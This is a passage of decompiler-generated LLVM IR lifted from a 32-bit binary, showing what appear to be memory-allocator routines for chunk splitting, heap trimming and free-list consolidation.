dec_label_pc_8052e4c:                             ; preds = %dec_label_pc_8052e2f, %dec_label_pc_8052e1e, %dec_label_pc_8052e05, %dec_label_pc_8052df4, %dec_label_pc_8052e40
  %v0_8052e4f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e4f = add i32 %v0_8052e4f, 8
  store i32 %v1_8052e4f, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052e56 = call i32 @function_80531d9(i32 %tmp7)
  br label %dec_label_pc_8052f7c

dec_label_pc_8052e60:                             ; preds = %dec_label_pc_8052d21, %dec_label_pc_8052dd7, %dec_label_pc_8052da5
  %v1_8052e71 = phi i32 [ %v1_8052d11, %dec_label_pc_8052d21 ], [ %v2_8052dde, %dec_label_pc_8052dd7 ], [ %v0_8052e60.pre, %dec_label_pc_8052da5 ]
  %v5_8052e62 = sub i32 %v1_8052e71, %stack_var_-40.0
  store i32 %v5_8052e62, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_8052e62, 16
  br i1 %tmp24, label %dec_label_pc_8052e6b, label %dec_label_pc_8052e7d

dec_label_pc_8052e6b:                             ; preds = %dec_label_pc_8052e60
  %v0_8052e6b = load i32, i32* @edi, align 4
  %v1_8052e6b = add i32 %v0_8052e6b, 4
  %v2_8052e6b = inttoptr i32 %v1_8052e6b to i32*
  %v3_8052e6b = load i32, i32* %v2_8052e6b, align 4
  %v1_8052e6e = urem i32 %v3_8052e6b, 2
  %v2_8052e71 = or i32 %v1_8052e6e, %v1_8052e71
  store i32 %v2_8052e71, i32* %eax.global-to-local, align 4
  store i32 %v2_8052e71, i32* %v2_8052e6b, align 4
  %v0_8052e76 = load i32, i32* @edi, align 4
  %v1_8052e76 = load i32, i32* @ebx, align 4
  %v2_8052e76 = add i32 %v0_8052e76, 4
  %v3_8052e76 = add i32 %v2_8052e76, %v1_8052e76
  %v4_8052e76 = inttoptr i32 %v3_8052e76 to i32*
  %v5_8052e76 = load i32, i32* %v4_8052e76, align 4
  %v6_8052e76 = or i32 %v5_8052e76, 1
  store i32 %v6_8052e76, i32* %v4_8052e76, align 4
  br label %dec_label_pc_8052ead

dec_label_pc_8052e7d:                             ; preds = %dec_label_pc_8052e60
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8052e81 = load i32, i32* @edi, align 4
  %v2_8052e81 = add i32 %v0_8052e81, %stack_var_-40.0
  store i32 %v2_8052e81, i32* %eax.global-to-local, align 4
  %v1_8052e84 = add i32 %v0_8052e81, 4
  %v2_8052e84 = inttoptr i32 %v1_8052e84 to i32*
  %v3_8052e84 = load i32, i32* %v2_8052e84, align 4
  %v1_8052e87 = urem i32 %v3_8052e84, 2
  %v5_8052e8a = or i32 %v1_8052e87, %stack_var_-40.0
  store i32 %v5_8052e8a, i32* %v2_8052e84, align 4
  %v0_8052e94 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052e96 = or i32 %v0_8052e94, 1
  store i32 %v1_8052e96, i32* %edx.global-to-local, align 4
  %v1_8052e99 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e99 = add i32 %v1_8052e99, 4
  %v3_8052e99 = inttoptr i32 %v2_8052e99 to i32*
  store i32 %v1_8052e96, i32* %v3_8052e99, align 4
  %v0_8052e9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e9c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052e9c = add i32 %v0_8052e9c, 4
  %v3_8052e9c = add i32 %v2_8052e9c, %v1_8052e9c
  %v4_8052e9c = inttoptr i32 %v3_8052e9c to i32*
  %v5_8052e9c = load i32, i32* %v4_8052e9c, align 4
  %v6_8052e9c = or i32 %v5_8052e9c, 1
  store i32 %v6_8052e9c, i32* %v4_8052e9c, align 4
  %v0_8052ea1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ea1 = add i32 %v0_8052ea1, 8
  store i32 %v1_8052ea1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052ea1, i32* %stack_var_-60, align 4
  %v1_8052ea5 = call i32 @function_80531d9(i32 %v1_8052ea1)
  store i32 %v1_8052ea5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ead

dec_label_pc_8052ead:                             ; preds = %dec_label_pc_8052e6b, %dec_label_pc_8052e7d
  %v0_8052ead = load i32, i32* @edi, align 4
  %v1_8052ead = add i32 %v0_8052ead, 8
  store i32 %v1_8052ead, i32* @ebx, align 4
  br label %dec_label_pc_8052f89

dec_label_pc_8052eb5:                             ; preds = %dec_label_pc_8052d05
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8052eb9 = load i32, i32* @global_var_8056b9c.207, align 4
  %v1_8052ebe = add i32 %v0_8052eb9, -1
  store i32 %v1_8052ebe, i32* %eax.global-to-local, align 4
  %v2_8052ec3 = inttoptr i32 %v1_8052d09 to i32*
  %v3_8052ec3 = load i32, i32* %v2_8052ec3, align 4
  store i32 %v3_8052ec3, i32* @ebp, align 4
  %v1_8052ec6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8052ec6, i32* %stack_var_-44, align 4
  %v2_8052ecc = add i32 %v3_8052ec3, %v1_8052ebe
  store i32 %v2_8052ecc, i32* %edx.global-to-local, align 4
  %v1_8052ecf = sub i32 0, %v0_8052eb9
  store i32 %v1_8052ecf, i32* %eax.global-to-local, align 4
  %v2_8052ed1 = add i32 %v2_8052ecc, %v1_8052ec6
  %v2_8052ed4 = and i32 %v2_8052ed1, %v1_8052ecf
  store i32 %v2_8052ed4, i32* @esi, align 4
  %v2_8052ed8 = sub i32 %v2_8052ed4, %v3_8052ec3
  store i32 %v2_8052ed8, i32* @ebx, align 4
  %v15_8052eda = icmp eq i32 %v1_8052d11, %v2_8052ed8
  br i1 %v15_8052eda, label %dec_label_pc_8052f85, label %dec_label_pc_8052ee4

dec_label_pc_8052ee4:                             ; preds = %dec_label_pc_8052eb5
  %v2_8052eeb = sub i32 %v1_8052d09, %v3_8052ec3
  store i32 %v2_8052eeb, i32* @edi, align 4
  %v2_8052eed = add i32 %v3_8052ec3, %v1_8052d11
  store i32 %v2_8052eed, i32* %eax.global-to-local, align 4
  store i32 %v2_8052eeb, i32* %stack_var_-60, align 4
  %v6_8052ef1 = inttoptr i32 %v2_8052eeb to i32*
  %v7_8052ef1 = call i32 @function_8054066(i32* %v6_8052ef1, i32 %v2_8052eed, i32 %v2_8052ed4, i32 1, i32 %v1_8052ec6, i32 %v1_8052d11)
  store i32 %v7_8052ef1, i32* %eax.global-to-local, align 4
  %v10_8052ef9 = icmp eq i32 %v7_8052ef1, -1
  br i1 %v10_8052ef9, label %dec_label_pc_8052f3d, label %dec_label_pc_8052efe

dec_label_pc_8052efe:                             ; preds = %dec_label_pc_8052ee4
  %v1_8052efe = load i32, i32* @ebp, align 4
  %v2_8052efe = add i32 %v1_8052efe, %v7_8052ef1
  store i32 %v2_8052efe, i32* %edx.global-to-local, align 4
  %v0_8052f01 = load i32, i32* @ebx, align 4
  %v1_8052f01 = or i32 %v0_8052f01, 2
  store i32 %v1_8052f01, i32* %ebx.global-to-local, align 4
  %v0_8052f04 = load i32, i32* @esi, align 4
  store i32 %v0_8052f04, i32* %eax.global-to-local, align 4
  %v2_8052f06 = add i32 %v2_8052efe, 4
  %v3_8052f06 = inttoptr i32 %v2_8052f06 to i32*
  store i32 %v1_8052f01, i32* %v3_8052f06, align 4
  %v0_8052f09 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052f09 = sub i32 %v0_8052f09, %v1_8052d11
  %v1_8052f0d = load i32, i32* @global_var_8056ba4.212, align 4
  %v2_8052f0d = add i32 %v1_8052f0d, %v5_8052f09
  store i32 %v2_8052f0d, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f0d, i32* @global_var_8056ba4.212, align 4
  %v1_8052f18 = load i32, i32* @global_var_8056bb0.213, align 16
  %tmp25 = icmp ugt i32 %v2_8052f0d, %v1_8052f18
  br i1 %tmp25, label %dec_label_pc_8052f20, label %dec_label_pc_8052f25

dec_label_pc_8052f20:                             ; preds = %dec_label_pc_8052efe
  store i32 %v2_8052f0d, i32* @global_var_8056bb0.213, align 16
  br label %dec_label_pc_8052f25

dec_label_pc_8052f25:                             ; preds = %dec_label_pc_8052efe, %dec_label_pc_8052f20
  %v1_8052f25 = load i32, i32* @global_var_8056ba8.214, align 8
  %v2_8052f25 = add i32 %v1_8052f25, %v2_8052f0d
  store i32 %v2_8052f25, i32* %eax.global-to-local, align 4
  %v1_8052f2b = load i32, i32* @global_var_8056bb4.215, align 4
  %tmp26 = icmp ugt i32 %v2_8052f25, %v1_8052f2b
  br i1 %tmp26, label %dec_label_pc_8052f33, label %dec_label_pc_8052f38

dec_label_pc_8052f33:                             ; preds = %dec_label_pc_8052f25
  store i32 %v2_8052f25, i32* @global_var_8056bb4.215, align 4
  br label %dec_label_pc_8052f38

dec_label_pc_8052f38:                             ; preds = %dec_label_pc_8052f25, %dec_label_pc_8052f33
  %v0_8052f38 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052f38 = add i32 %v0_8052f38, 8
  store i32 %v1_8052f38, i32* @ebx, align 4
  br label %dec_label_pc_8052f89

dec_label_pc_8052f3d:                             ; preds = %dec_label_pc_8052ee4
  %v2_8052f3d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8052f3d, i32* %eax.global-to-local, align 4
  %v10_8052f40 = icmp ult i32 %v1_8052d11, %v2_8052f3d
  %v1_8052f44 = icmp eq i1 %v10_8052f40, false
  br i1 %v1_8052f44, label %dec_label_pc_8052f85, label %dec_label_pc_8052f46

dec_label_pc_8052f46:                             ; preds = %dec_label_pc_8052f3d
  %v1_8052f4d = add i32 %stack_var_-40.0, -7
  store i32 %v1_8052f4d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f4d, i32* %stack_var_-60, align 4
  %v1_8052f51 = call i32 @function_8052414(i32 %v1_8052f4d)
  store i32 %v1_8052f51, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f51, i32* @ebx, align 4
  %v1_8052f5b = icmp eq i32 %v1_8052f51, 0
  br i1 %v1_8052f5b, label %dec_label_pc_8052f81, label %dec_label_pc_8052f5f

dec_label_pc_8052f5f:                             ; preds = %dec_label_pc_8052f46
  %v1_8052f64 = add i32 %v1_8052d11, -8
  store i32 %v1_8052f64, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f51, i32* %stack_var_-60, align 4
  %v3_8052f6d = inttoptr i32 %v1_8052f51 to i16*
  %v4_8052f6d = call i32 @function_8054202(i16* %v3_8052f6d, i32 %tmp7, i32 %v1_8052f64)
  store i32 %v4_8052f6d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f51, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052f77 = call i32 @function_80531d9(i32 %tmp7)
  br label %dec_label_pc_8052f7c

dec_label_pc_8052f7c:                             ; preds = %dec_label_pc_8052e4c, %dec_label_pc_8052f5f
  %storemerge = phi i32 [ %v1_8052f77, %dec_label_pc_8052f5f ], [ %v1_8052e56, %dec_label_pc_8052e4c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f89

dec_label_pc_8052f81:                             ; preds = %dec_label_pc_8052f46, %dec_label_pc_8052db0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052f89

dec_label_pc_8052f85:                             ; preds = %dec_label_pc_8052f3d, %dec_label_pc_8052eb5, %dec_label_pc_8052d4f
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8052f89

dec_label_pc_8052f89:                             ; preds = %dec_label_pc_8052f81, %dec_label_pc_8052f7c, %dec_label_pc_8052f38, %dec_label_pc_8052ead, %dec_label_pc_8052f85
  store i32 %v2_8052cbe, i32* @eax, align 4
  store i32 %v2_8052cbe, i32* %stack_var_-60, align 4
  %v2_8052f92 = call i32 @function_8053940(i32 %v2_8052cbe, i32 1)
  store i32 %v2_8052f92, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f97

dec_label_pc_8052f97:                             ; preds = %dec_label_pc_8052ca2, %dec_label_pc_8052c8e, %dec_label_pc_8052f89
  br label %dec_label_pc_8052f9a

dec_label_pc_8052f9a:                             ; preds = %dec_label_pc_8052cdc, %dec_label_pc_8052f97
  %v0_8052f9d = load i32, i32* @ebx, align 4
  store i32 %v0_8052f9d, i32* %eax.global-to-local, align 4
  store i32 %v0_8052c7f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052f9d

; uselistorder directives
  uselistorder i32 %v1_8052f51, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8052f25, { 1, 0, 2 }
  uselistorder i32 %v2_8052f0d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052eeb, { 1, 0, 2 }
  uselistorder i32 %v1_8052ec6, { 1, 0, 2 }
  uselistorder i32 %v3_8052ec3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8052e81, { 1, 0 }
  uselistorder i32 %v1_8052de7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8052dbb, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8052d5f, { 1, 0, 2 }
  uselistorder i32 %v3_8052d72, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8052d2f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8052d11, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8052d09, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_8052cfe, { 1, 0 }
  uselistorder i32 %v1_8052cee, { 0, 2, 1 }
  uselistorder i32 %v0_8052cd7, { 1, 0 }
  uselistorder i32 %v2_8052cbe, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_80531d9, { 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 (i32)* @function_8052414, { 54, 53, 52, 0, 1, 3, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052f9a, { 1, 0 }
  uselistorder label %dec_label_pc_8052f97, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052f89, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052f7c, { 1, 0 }
  uselistorder label %dec_label_pc_8052f38, { 1, 0 }
  uselistorder label %dec_label_pc_8052f25, { 1, 0 }
  uselistorder label %dec_label_pc_8052ead, { 1, 0 }
  uselistorder label %dec_label_pc_8052e60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052e4c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052da5, { 1, 0 }
  uselistorder label %dec_label_pc_8052d05, { 1, 0 }
}

define i32 @function_8052fa4() local_unnamed_addr {
dec_label_pc_8052fa4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8052fab = load i32, i32* @edx, align 4
  store i32 %v0_8052fab, i32* %ebp.global-to-local, align 4
  %v1_8052fad = add i32 %v0_8052fab, 860
  %v2_8052fad = inttoptr i32 %v1_8052fad to i32*
  %v3_8052fad = load i32, i32* %v2_8052fad, align 4
  store i32 %v3_8052fad, i32* %ecx.global-to-local, align 4
  %v1_8052fb3 = add i32 %v0_8052fab, 44
  %v2_8052fb3 = inttoptr i32 %v1_8052fb3 to i32*
  %v3_8052fb3 = load i32, i32* %v2_8052fb3, align 4
  %v1_8052fb6 = add i32 %v3_8052fb3, 4
  %v2_8052fb6 = inttoptr i32 %v1_8052fb6 to i32*
  %v3_8052fb6 = load i32, i32* %v2_8052fb6, align 4
  %v1_8052fb9 = and i32 %v3_8052fb6, -4
  store i32 %v1_8052fb9, i32* @esi, align 4
  %v1_8052fbe = load i32, i32* @eax, align 4
  %v2_8052fbe = add i32 %v3_8052fad, -17
  %v2_8052fc0 = add i32 %v2_8052fbe, %v1_8052fb9
  %v3_8052fc0 = sub i32 %v2_8052fc0, %v1_8052fbe
  %div = udiv i32 %v3_8052fc0, %v3_8052fad
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8052fc0, %v3_8052fad
  store i32 %tmp10, i32* @edx, align 4
  %v1_8052fc8 = add i32 %div, -1
  %v4_8052fcb = mul i32 %v1_8052fc8, %v3_8052fad
  store i32 %v4_8052fcb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052fcb, 1
  br i1 %tmp11, label %dec_label_pc_8053027, label %dec_label_pc_8052fd2

dec_label_pc_8052fd2:                             ; preds = %dec_label_pc_8052fa4
  %v1_8052fd7 = call i32 @function_8054109(i32 0)
  store i32 %v1_8052fd7, i32* %edi.global-to-local, align 4
  %v0_8052fde = load i32, i32* @esi, align 4
  store i32 %v0_8052fde, i32* %eax.global-to-local, align 4
  %v1_8052fe0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052fe0 = add i32 %v1_8052fe0, 44
  %v3_8052fe0 = inttoptr i32 %v2_8052fe0 to i32*
  %v4_8052fe0 = load i32, i32* %v3_8052fe0, align 4
  %v5_8052fe0 = add i32 %v4_8052fe0, %v0_8052fde
  store i32 %v5_8052fe0, i32* %eax.global-to-local, align 4
  %v12_8052fe6 = icmp eq i32 %v1_8052fd7, %v5_8052fe0
  %v1_8052fe8 = icmp eq i1 %v12_8052fe6, false
  br i1 %v1_8052fe8, label %dec_label_pc_8053027, label %dec_label_pc_8052fea

dec_label_pc_8052fea:                             ; preds = %dec_label_pc_8052fd2
  %v1_8052fed = sub i32 0, %v4_8052fcb
  store i32 %v1_8052fed, i32* @ebx, align 4
  %v1_8052ff0 = call i32 @function_8054109(i32 %v1_8052fed)
  store i32 %v1_8052ff0, i32* %eax.global-to-local, align 4
  %v1_8052ffc = call i32 @function_8054109(i32 0)
  store i32 %v1_8052ffc, i32* %eax.global-to-local, align 4
  %v10_8053004 = icmp eq i32 %v1_8052ffc, -1
  br i1 %v10_8053004, label %dec_label_pc_8053027, label %dec_label_pc_8053009

dec_label_pc_8053009:                             ; preds = %dec_label_pc_8052fea
  %v0_8053009 = load i32, i32* %edi.global-to-local, align 4
  %v2_805300b = sub i32 %v0_8053009, %v1_8052ffc
  %v12_805300b = icmp eq i32 %v2_805300b, 0
  store i32 %v2_805300b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805300b, label %dec_label_pc_8053027, label %dec_label_pc_805300f

dec_label_pc_805300f:                             ; preds = %dec_label_pc_8053009
  %v0_805300f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805300f = add i32 %v0_805300f, 44
  %v2_805300f = inttoptr i32 %v1_805300f to i32*
  %v3_805300f = load i32, i32* %v2_805300f, align 4
  store i32 %v3_805300f, i32* %eax.global-to-local, align 4
  %v1_8053012 = add i32 %v0_805300f, 872
  %v2_8053012 = inttoptr i32 %v1_8053012 to i32*
  %v3_8053012 = load i32, i32* %v2_8053012, align 4
  %v5_8053012 = sub i32 %v3_8053012, %v2_805300b
  store i32 %v5_8053012, i32* %v2_8053012, align 4
  %v0_8053018 = load i32, i32* @esi, align 4
  %v1_8053018 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053018 = sub i32 %v0_8053018, %v1_8053018
  %v1_805301a = or i32 %v2_8053018, 1
  %v1_805301d = load i32, i32* %eax.global-to-local, align 4
  %v2_805301d = add i32 %v1_805301d, 4
  %v3_805301d = inttoptr i32 %v2_805301d to i32*
  store i32 %v1_805301a, i32* %v3_805301d, align 4
  br label %dec_label_pc_8053029

dec_label_pc_8053027:                             ; preds = %dec_label_pc_8053009, %dec_label_pc_8052fea, %dec_label_pc_8052fd2, %dec_label_pc_8052fa4
  br label %dec_label_pc_8053029

dec_label_pc_8053029:                             ; preds = %dec_label_pc_805300f, %dec_label_pc_8053027
  %storemerge = phi i32 [ 1, %dec_label_pc_805300f ], [ 0, %dec_label_pc_8053027 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052ffc, { 1, 0, 2 }
  uselistorder i32 %v4_8052fcb, { 1, 2, 0 }
  uselistorder i32 %v3_8052fad, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8054109, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053029, { 1, 0 }
}

define i32 @function_8053031(i32* %arg1) local_unnamed_addr {
dec_label_pc_8053031:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8053032 = load i32, i32* @edi, align 4
  %v0_8053033 = load i32, i32* @esi, align 4
  %v0_8053034 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805303c = load i32, i32* %arg1, align 4
  store i32 %v2_805303c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053043 = icmp eq i32 %v2_805303c, 0
  br i1 %v1_8053043, label %dec_label_pc_805315d.lr.ph, label %dec_label_pc_805304b

dec_label_pc_805315d.lr.ph:                       ; preds = %dec_label_pc_8053031
  %v3_8053161 = add i32 %tmp20, 44
  br label %dec_label_pc_805315d

dec_label_pc_805304b:                             ; preds = %dec_label_pc_8053031
  %v1_805304f = and i32 %v2_805303c, -3
  store i32 %v1_805304f, i32* %arg1, align 4
  %v1_8053054 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805305f = add i32 %tmp20, 4
  store i32 %v1_805305f, i32* %eax.global-to-local, align 4
  %v2_805306a = load i32, i32* %arg1, align 4
  %v2_8053070 = udiv i32 %v2_805306a, 8
  %v2_8053073 = mul nuw i32 %v2_8053070, 4
  %v3_8053073 = add i32 %tmp20, -4
  %v4_8053073 = add i32 %v3_8053073, %v2_8053073
  store i32 %v4_8053073, i32* %eax.global-to-local, align 4
  %v2_805313a = add i32 %tmp20, 44
  %v3_805313a = inttoptr i32 %v2_805313a to i32*
  %v1_805310d = add i32 %tmp20, 60
  %v2_805310d = inttoptr i32 %v1_805310d to i32*
  br label %dec_label_pc_805307b

dec_label_pc_805307b:                             ; preds = %dec_label_pc_8053153, %dec_label_pc_805304b
  %v0_8053089 = phi i32 [ %v1_805305f, %dec_label_pc_805304b ], [ %v4_8053153, %dec_label_pc_8053153 ]
  store i32 %v0_8053089, i32* %eax.global-to-local, align 4
  %v1_805307f = inttoptr i32 %v0_8053089 to i32*
  %v2_805307f = load i32, i32* %v1_805307f, align 4
  store i32 %v2_805307f, i32* @ecx, align 4
  %v1_8053081 = icmp eq i32 %v2_805307f, 0
  br i1 %v1_8053081, label %dec_label_pc_8053149, label %dec_label_pc_8053089

dec_label_pc_8053089:                             ; preds = %dec_label_pc_805307b
  store i32 0, i32* %v1_805307f, align 4
  %v0_805308f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805308f

dec_label_pc_805308f:                             ; preds = %dec_label_pc_805313d, %dec_label_pc_8053089
  %v0_80530ac = phi i32 [ %v3_805308f, %dec_label_pc_805313d ], [ %v0_805308f.pre, %dec_label_pc_8053089 ]
  %v1_805308f = add i32 %v0_80530ac, 8
  %v2_805308f = inttoptr i32 %v1_805308f to i32*
  %v3_805308f = load i32, i32* %v2_805308f, align 4
  store i32 %v3_805308f, i32* %edx.global-to-local, align 4
  %v1_8053096 = add i32 %v0_80530ac, 4
  %v2_8053096 = inttoptr i32 %v1_8053096 to i32*
  %v3_8053096 = load i32, i32* %v2_8053096, align 4
  store i32 %v3_8053096, i32* %eax.global-to-local, align 4
  %v1_805309b = and i32 %v3_8053096, -2
  store i32 %v1_805309b, i32* @edi, align 4
  %v2_805309e = urem i32 %v3_8053096, 2
  %v3_805309e = icmp eq i32 %v2_805309e, 0
  %v2_80530a0 = add i32 %v1_805309b, %v0_80530ac
  store i32 %v2_80530a0, i32* @ebx, align 4
  %v1_80530a3 = add i32 %v2_80530a0, 4
  %v2_80530a3 = inttoptr i32 %v1_80530a3 to i32*
  %v3_80530a3 = load i32, i32* %v2_80530a3, align 4
  store i32 %v3_80530a3, i32* %edx.global-to-local, align 4
  %v1_80530aa = icmp eq i1 %v3_805309e, false
  br i1 %v1_80530aa, label %dec_label_pc_80530cc, label %dec_label_pc_80530ac

dec_label_pc_80530ac:                             ; preds = %dec_label_pc_805308f
  %v1_80530ac = inttoptr i32 %v0_80530ac to i32*
  %v2_80530ac = load i32, i32* %v1_80530ac, align 4
  store i32 %v2_80530ac, i32* %ebp.global-to-local, align 4
  %v2_80530b0 = sub i32 %v0_80530ac, %v2_80530ac
  store i32 %v2_80530b0, i32* %eax.global-to-local, align 4
  %v1_80530b2 = add i32 %v2_80530b0, 8
  %v2_80530b2 = inttoptr i32 %v1_80530b2 to i32*
  %v3_80530b2 = load i32, i32* %v2_80530b2, align 4
  store i32 %v3_80530b2, i32* @esi, align 4
  %v1_80530b5 = add i32 %v2_80530b0, 12
  %v2_80530b5 = inttoptr i32 %v1_80530b5 to i32*
  %v3_80530b5 = load i32, i32* %v2_80530b5, align 4
  store i32 %v3_80530b5, i32* %edx.global-to-local, align 4
  %v1_80530b8 = add i32 %v3_80530b2, 12
  %v2_80530b8 = inttoptr i32 %v1_80530b8 to i32*
  %v3_80530b8 = load i32, i32* %v2_80530b8, align 4
  store i32 %v3_80530b8, i32* @ecx, align 4
  %v12_80530bb = icmp eq i32 %v3_80530b8, %v2_80530b0
  %v1_80530bd = icmp eq i1 %v12_80530bb, false
  br i1 %v1_80530bd, label %dec_label_pc_80530fc, label %dec_label_pc_80530bf

dec_label_pc_80530bf:                             ; preds = %dec_label_pc_80530ac
  %v1_80530bf = add i32 %v3_80530b5, 8
  %v2_80530bf = inttoptr i32 %v1_80530bf to i32*
  %v3_80530bf = load i32, i32* %v2_80530bf, align 4
  %v15_80530bf = icmp eq i32 %v3_80530bf, %v3_80530b8
  %v1_80530c2 = icmp eq i1 %v15_80530bf, false
  br i1 %v1_80530c2, label %dec_label_pc_80530fc, label %dec_label_pc_80530c4

dec_label_pc_80530c4:                             ; preds = %dec_label_pc_80530bf
  %v2_80530c4 = add i32 %v2_80530ac, %v1_805309b
  store i32 %v2_80530c4, i32* @edi, align 4
  store i32 %v3_80530b5, i32* %v2_80530b8, align 4
  %v0_80530c9 = load i32, i32* @esi, align 4
  %v1_80530c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80530c9 = add i32 %v1_80530c9, 8
  %v3_80530c9 = inttoptr i32 %v2_80530c9 to i32*
  store i32 %v0_80530c9, i32* %v3_80530c9, align 4
  %v0_80530d7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80530cc

dec_label_pc_80530cc:                             ; preds = %dec_label_pc_805308f, %dec_label_pc_80530c4
  %v1_80530e0 = phi i32 [ %v2_80530a0, %dec_label_pc_805308f ], [ %v0_80530d7.pre, %dec_label_pc_80530c4 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80530d4 = and i32 %v3_80530a3, -4
  store i32 %v1_80530d4, i32* %ebp.global-to-local, align 4
  %v4_80530d7 = load i32, i32* %v3_805313a, align 4
  %v15_80530d7 = icmp eq i32 %v1_80530e0, %v4_80530d7
  br i1 %v15_80530d7, label %dec_label_pc_805312d, label %dec_label_pc_80530dc

dec_label_pc_80530dc:                             ; preds = %dec_label_pc_80530cc
  %v2_80530dc = add i32 %v1_80530e0, 4
  %v3_80530dc = add i32 %v2_80530dc, %v1_80530d4
  %v4_80530dc = inttoptr i32 %v3_80530dc to i32*
  %v5_80530dc = load i32, i32* %v4_80530dc, align 4
  store i32 %v5_80530dc, i32* %eax.global-to-local, align 4
  %v3_80530e0 = inttoptr i32 %v2_80530dc to i32*
  store i32 %v1_80530d4, i32* %v3_80530e0, align 4
  %v0_80530e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530e3 = urem i32 %v0_80530e3, 2
  %v2_80530e3 = icmp eq i32 %v1_80530e3, 0
  store i32 %v1_80530e3, i32* %eax.global-to-local, align 4
  %v1_80530e8 = icmp eq i1 %v2_80530e3, false
  br i1 %v1_80530e8, label %dec_label_pc_8053109, label %dec_label_pc_80530ea

